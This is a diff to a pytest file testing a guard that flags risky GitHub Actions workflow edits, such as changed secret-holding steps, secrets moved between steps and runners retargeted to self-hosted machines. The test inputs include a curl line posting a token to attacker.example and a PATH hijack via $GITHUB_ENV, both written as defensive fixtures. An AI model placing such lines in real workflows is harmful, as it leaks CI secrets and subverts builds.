@@ -32,6 +32,7 @@ jobs:
       - run: make test
         env:
           TOKEN: ${{ secrets.CODECOV_TOKEN }}
+      - run: make lint
 """
 
 
@@ -43,7 +44,7 @@ def test_repair_edits_pass() -> None:
     head = (
         BASE.replace("timeout-minutes: 10", "timeout-minutes: 30")
         .replace("actions/checkout@v4", "actions/checkout@v5")
-        .replace("run: make test", "run: make test PYTEST_ARGS=-x")
+        .replace("run: make lint", "run: make lint LINT_ARGS=--fix")
     )
     assert check(head) == []
 
@@ -114,7 +115,94 @@ def test_secret_added_in_bracket_or_whole_context_form_is_caught(added: str) -> 
 
 def test_bracket_form_matches_its_dotted_equivalent() -> None:
     head = BASE.replace("secrets.CODECOV_TOKEN", "secrets['CODECOV_TOKEN']")
+    # Same reference set; the secret-holding step's text still changed, which the
+    # frozen-step rule refuses on its own.
+    assert "secrets/vars references changed" not in check(head)
+    assert check(head) == [
+        "job `test`: steps through the last secret-holding step changed"
+    ]
+
+
+SECRET_STEP = "job `test`: steps through the last secret-holding step changed"
+
+
+def test_run_edit_in_a_secret_holding_step_is_caught() -> None:
+    head = BASE.replace(
+        "run: make test", 'run: curl -d "$TOKEN" https://attacker.example'
+    )
+    assert SECRET_STEP in check(head)
+
+
+def test_moving_a_secret_env_entry_to_another_step_is_caught() -> None:
+    head = BASE.replace(
+        "      - run: make test\n        env:\n          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n"
+        "      - run: make lint\n",
+        "      - run: make test\n      - run: make lint\n        env:\n"
+        "          TOKEN: ${{ secrets.CODECOV_TOKEN }}\n",
+    )
+    assert head != BASE
+    assert SECRET_STEP in check(head)
+
+
+def test_step_inserted_before_a_secret_holding_step_is_caught() -> None:
+    head = BASE.replace(
+        "      - run: make test\n",
+        "      - run: echo PATH=/tmp/evil >> $GITHUB_ENV\n      - run: make test\n",
+    )
+    assert SECRET_STEP in check(head)
+
+
+def test_step_after_the_last_secret_holding_step_may_change() -> None:
+    head = BASE + "      - run: make docs\n"
     assert check(head) == []
+
+
+def test_job_env_secret_freezes_every_step_in_the_job() -> None:
+    base = BASE.replace(
+        "    timeout-minutes: 10\n",
+        "    timeout-minutes: 10\n    env:\n      PAT: ${{ secrets.ADMIN_PAT }}\n",
+    )
+    head = base.replace("run: make lint", "run: make lint LINT_ARGS=--fix")
+    assert check(head, base=base) == [
+        "job `test`: a step changed in a secret-scoped job"
+    ]
+
+
+def test_workflow_env_secret_freezes_every_step() -> None:
+    base = BASE.replace(
+        "permissions:\n", "env:\n  PAT: ${{ secrets.ADMIN_PAT }}\npermissions:\n"
+    )
+    head = base.replace("run: make lint", "run: make lint LINT_ARGS=--fix")
+    assert check(head, base=base) == [
+        "job `test`: a step changed in a secret-scoped job"
+    ]
+
+
+MATRIX_BASE = BASE.replace(
+    "    runs-on: ubuntu-24.04\n",
+    "    strategy:\n      matrix:\n        os: [ubuntu-24.04]\n"
+    "    runs-on: ${{ matrix.os }}\n",
+)
+
+
+def test_matrix_retargeting_runs_on_is_caught() -> None:
+    head = MATRIX_BASE.replace("os: [ubuntu-24.04]", "os: [self-hosted]")
+    assert "job `test`: `strategy` changed" in check(head, base=MATRIX_BASE)
+
+
+@pytest.mark.parametrize(
+    ("key", "block"),
+    [
+        ("env", "    env:\n      MODE: ci\n"),
+        ("defaults", "    defaults:\n      run:\n        shell: bash\n"),
+        ("concurrency", "    concurrency: test\n"),
+    ],
+)
+def test_job_level_trust_keys_are_compared(key: str, block: str) -> None:
+    head = BASE.replace(
+        "    timeout-minutes: 10\n", "    timeout-minutes: 10\n" + block
+    )
+    assert f"job `test`: `{key}` changed" in check(head)
 
 
 def test_forbidden_event_names_in_trigger_filters_are_not_events() -> None:
